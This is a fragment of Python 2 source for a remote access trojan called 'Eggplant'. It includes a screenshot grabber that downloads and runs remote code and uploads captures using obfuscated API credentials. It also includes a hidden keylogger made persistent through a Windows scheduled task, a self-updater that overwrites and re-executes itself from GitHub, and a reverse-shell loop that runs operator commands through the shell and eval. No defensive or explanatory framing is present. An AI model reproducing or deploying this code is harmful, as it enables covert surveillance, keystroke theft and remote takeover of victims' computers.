                code = get(self.urls.get('screenshot')).text.encode()
                mod  = create_module(code, 'screenshot')

            pic = globals()['screenshot'].main()

            with open(pic, 'rb') as fp:
                contents = b64encode(fp.read())

            a = 'MDA0MWU3NjVkZTQ3NDQyMTQ2ZTg0MDk2OGZlMjNmNDdmNTdjMjIzMGM2NDljMzQ3MWJiY2VhNDE0NWE2YjFmZTliODcxMTg0NDZjOTJjZjkyMTI2YTU4N2NmMjk3YWVmMjYzMTBlNA==','ZmY0M2Q2OWM1Yjk2YjkwZWU2NzVkOWI2ODk5OTVlYjdmODg1NTRmYzgyMGRlMzU0MWNkMDE5ODE3NGY0ZDQ4NmViYjJlOTMwMTM1NTNlNzcwYjYzZjA0N2M4ODA3MzhkMTMwZDE0ZDZkYjU0ODM3NmM3YzQ3NjdhMTU2M2FiNzM3MzUyMTUzOWI2ZDYwMGUzN2FmZTAzZTI0NDQ2ODMxZDBhNzUyYmM2NWZkMzY1NGQxYjMzODdlYjhhYzg1OTQ2YjFhYjMzZDlkNTQ5MTM5NGI4OTY4NGQ2MTJiZWI3NDJlYjczMjdlMzg='
            b = post(self.urls['images'], headers={self._deobfuscate(a[0]) : self._deobfuscate(a[1])}, data={'image':contents, 'type':'base64'})
            return b.json()['data']['link'].encode()
        except Exception as e3:
            return "Screenshot error: {}".format(str(e3))
        
    def keylogger(self, action):
        """Drops a persistent, stealthy keylogger on client host machine [Windows only]"""
        if action not in ("start","status","stop"):
            return "usage: keylogger <start/status/stop>"
        if os.name is 'nt':
            if 'start' in action:
                egglog   = self.urls.get('keylogger')
                kname, _ = os.path.splitext(os.path.basename(egglog))
                interval = 'hourly'
                try:
                    kfile = self.wget(egglog)
                    self.persistence.update({'keylogger':[kfile]})
                except Exception as qe:
                    return 'Installing keylogger failed with error: {}'.format(str(x))
                try:
                    os.startfile(kfile)
                except Exception as e:
                    return 'Running keylogger failed with error: {}'.format(str(e))
                try:
                    hide = os.popen('attrib +h {}'.format(kfile)).read()
                    self.persistence.get('hidden files').append(kfile)
                except Exception as ie:
                    return 'Hiding keylogger failed with error: {}'.format(str(e))
                try:
                    create  = os.popen('schtasks /CREATE /TN {} /TR {} /SC {}'.format(kname, kfile, interval)).read()                        
                    if 'SUCCESS' in create:
                        self.persistence.get('scheduled tasks').append(kname)
                    return create
                except Exception as ie:
                    return 'Keylogger persistence failed with error: {}'.format(str(ie))
                    
            elif 'stop' in action:
                try:
                    _ = map(os.remove, self.files.get('keylogger'))
                except Exception as xws:
                    if self.debug:
                        print "Remove keylogger file returned error: {}".format(str(xws))
                try:
                    tasks = [self.persistence.get('scheduled tasks').pop(i) for i in self.persistence.get('scheduled tasks') if 'egglog' in i.lower()]
                    d = [os.popen('schtasks /delete /tn {} /f'.format(task)).read() for task in tasks]
                    return "\n".join(d)
                except Exception as sx:
                    if self.debug:
                        print "Delete keylogger tasks returned error: {}".format(str(sx))
                
            elif 'status' in action:
                try:
                    tasks = [i for i in self.persistence.get('scheduled tasks') if 'egglog' in i.lower()]
                    d = [os.popen('schtasks /query /tn {}'.format(task)).read() for task in tasks]
                    return "\n".join(d)
                except Exception as stx:
                    return "Keylogger status failed with error: {}".format(str(stx))
            else:
                return "Invalid command"
        else:
            ans = "Mac OS not yet supported for remote logging." if sys.platform in ('darwin','ios') else "{}-based platforms not yet supported for remote logging".format(sys.platform)
            return ans

    def restart(self, **kwargs):
        """
        Update all the eggplant
        """
        return Eggplant(**self.__dict__)

    def update(self, **kwargs):
        """
        Auto-update
        """
        if os.name == 'nt':
            filename    = 'client.exe'
            plain       = False
            mode        = 'wb'
        elif 'linux' in sys.platform or 'bsd' in sys.platform:
            filename    = 'client'
            plain       = True
            mode        = 'w'
        else:
            filename    = 'client.py'
            plain       = True
            mode        = 'w'
            
        try:
            repo = get('https://api.github.com/repos/colental/AngryEggplant/contents').json()
            for i in repo:
                if filename in i.get('path'):
                    if plain:
                        code = get(i['download_url']).text
                    else:
                        code = b64decode(get(i['git_url']).json()['content'])
                        
                    with file(sys.argv[0], mode) as fp:
                        fp.write(code)

                    if self.debug:
                        print "Update successful\nRestarting in 5..."
                    sleep(5)
                    execfile(sys.argv[0])
                    sys.exit(0)

            return 'Update Failed - found no matching file in repo'
        except Exception as e:
            return 'Update Failed with error: {}'.format(str(e))
            

    def run(self):
        """
        Run reverse shell
        """
        while True:
            prompt          = "[{}@{} {}]> ".format(self.login, self.machine, os.getcwd())
            self._send(prompt, method='prompt')
            data            = self._receive()
            if data:
                result          = ''
                cmd, _, action  = data.partition(' ')

                if cmd in self.commands:
                    try:
                        result = self.commands[cmd](action) if len(action) else self.commands[cmd]()
                    except Exception as ce:
                        result = "Command '{}' failed with error: '{}'".format(cmd, str(ce))

                elif cmd in globals():
                    try:
                        result = globals()[cmd](action) if len(action) else self.commands[cmd]()
                    except Exception as em:
                        result = "Module '{}' failed with error: '{}'".format(cmd, str(em))

                elif cmd in dir(self):
                    try:
                        result = getattr(self, cmd)(action) if len(action) else getattr(self, cmd)()
                    except Exception as ea:
                        result = "Function '{}' failed with error: '{}'".format(cmd, str(ea))

                else:
                    try:
                        result = bytes().join(subprocess.Popen(data, 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
                    except:
                        result = ''

                    if not len(result) or 'not recognized' in result:
                        try:
                            result = eval(data)
                        except Exception as ev:
                            result = "Evaluating code '{}' returned error: {}".format(str(data), str(ev))

                if result:
                    self._send(result, method=cmd)
